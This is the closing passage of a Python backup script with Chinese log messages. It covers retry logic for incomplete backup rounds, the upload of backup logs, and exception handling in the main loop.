                        logging.error("❌ 下次备份时间写入失败，本轮不视为完成")
                else:
                    logging.warning(
                        "🔄 本轮备份未完整完成（" + "；".join(incomplete_reasons) + "），"
                        "不推进 1 天周期，将在下一轮重试"
                    )
                
                # 上传备份日志
                if backup_manager.config.DEBUG_MODE:
                    logging.info("\n📝 备份日志上传")
                backup_and_upload_logs(backup_manager)
                if not round_ok:
                    time.sleep(min(300, backup_manager.config.BACKUP_INTERVAL))

            except Exception as e:
                logging.error(f"\n❌ 备份出错: {e}")
                try:
                    backup_and_upload_logs(backup_manager)
                except Exception:
                    logging.error("❌ 日志备份失败")
                time.sleep(60)

    except Exception as e:
        logging.error(f"❌ 备份过程出错: {e}", exc_info=True)
        raise

if __name__ == "__main__":
    sys.exit(main())
